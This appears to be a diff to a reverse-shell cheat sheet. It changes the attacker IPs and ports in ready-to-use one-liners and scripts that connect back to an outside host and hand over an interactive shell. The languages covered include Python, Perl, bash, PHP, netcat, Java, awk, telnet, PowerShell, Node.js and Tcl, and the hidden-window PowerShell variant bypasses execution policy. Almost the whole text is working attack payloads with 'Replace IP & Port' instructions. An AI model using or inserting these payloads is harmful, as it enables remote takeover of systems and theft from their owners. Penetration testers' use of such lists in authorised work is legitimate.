@@ -27,7 +27,7 @@ Basic reverse shells for any scenario
 One-Liner 
 -----------------------------------------------------------
 
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
 // Replace the IP & Port
 
@@ -40,7 +40,7 @@ import subprocess
 import os
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect(("10.0.0.1",1234)); 
+s.connect(("10.10.10.10",443)); 
 os.dup2(s.fileno(),0);
 os.dup2(s.fileno(),1);
 os.dup2(s.fileno(),2);
@@ -57,7 +57,7 @@ p=subprocess.call(["/bin/bash","-i"]);'
 One-Liner 
 -----------------------------------------------------------
 
-perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
+perl -e 'use Socket;$i="10.10.10.10";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
 
 // Replace IP & Port
 
@@ -69,7 +69,7 @@ perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotob
 One-Liner 
 -----------------------------------------------------------
 
-bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+bash -i >& /dev/tcp/10.10.10.10/443 0>&1
 
 // Replace IP & Port
 
@@ -96,7 +96,7 @@ nc -u -lvp 443
 One-Liner 
 -----------------------------------------------------------
 
-php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("10.10.10.10",443);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 // Replace IP & Port
 
@@ -108,8 +108,8 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 One-Liner 
 -----------------------------------------------------------
 
-nc -e /bin/sh 10.0.0.1 1234
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f 
+nc -e /bin/sh 10.10.10.10 443
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 443 >/tmp/f 
 
 // Replace IP & Port
 
@@ -122,7 +122,7 @@ One-Liner
 -----------------------------------------------------------
 
 r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 
 // Replace IP & Port
@@ -136,7 +136,7 @@ One-Liner
 -----------------------------------------------------------
 
 String host="localhost";
-int port=8044;
+int port=443;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 
@@ -153,7 +153,7 @@ One-Liner
 #!/usr/bin/gawk -f
 
 BEGIN {
-        Port    =       8080
+        Port    =       443
         Prompt  =       "bkd> "
 
         Service = "/inet/tcp/" Port "/0/0"
@@ -171,7 +171,7 @@ BEGIN {
         }
 }
 
-// Replace IP & Port
+// Replace Port
 
 ```
 
@@ -181,7 +181,7 @@ BEGIN {
 One-Liner 
 -----------------------------------------------------------
 
-rm -f /tmp/p; mknod /tmp/p p && telnet 102.252.66.99 443 0/tmp/p 2>&1
+rm -f /tmp/p; mknod /tmp/p p && telnet 10.10.10.10 443 0/tmp/p 2>&1
 
 // Replace IP & Port
 
@@ -193,7 +193,7 @@ rm -f /tmp/p; mknod /tmp/p p && telnet 102.252.66.99 443 0/tmp/p 2>&1
 One-Liner 
 -----------------------------------------------------------
 
-awk 'BEGIN {s = "/inet/tcp/0/102.252.66.99/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+awk 'BEGIN {s = "/inet/tcp/0/10.10.10.10/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 
 // Replace IP & Port
 
@@ -223,7 +223,7 @@ socat file:`tty`,raw,echo=0 tcp-listen:443
 One-Liner 
 -----------------------------------------------------------
 
-xterm -display 102.252.66.99:1
+xterm -display 10.10.10.10:1
 Xnest :1
 xhost +targetip
 
@@ -237,9 +237,9 @@ xhost +targetip
 One-Liner's 
 -----------------------------------------------------------
 
-powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("102.252.66.99",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('102.252.66.99',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
 // Replace IP & Port
 
@@ -256,7 +256,7 @@ One-Liner's
         cp = require("child_process"),
         sh = cp.spawn("/bin/sh", []);
     var client = new net.Socket();
-    client.connect(443, "102.252.66.99", function(){
+    client.connect(443, "10.10.10.10", function(){
         client.pipe(sh.stdin);
         sh.stdout.pipe(client);
         sh.stderr.pipe(client);
@@ -274,7 +274,7 @@ One-Liner's
 One-Liner's 
 -----------------------------------------------------------
 
-echo 'set s [socket 102.252.66.99 443];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
+echo 'set s [socket 10.10.10.10 443];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
 
 // Replace IP & Port
 
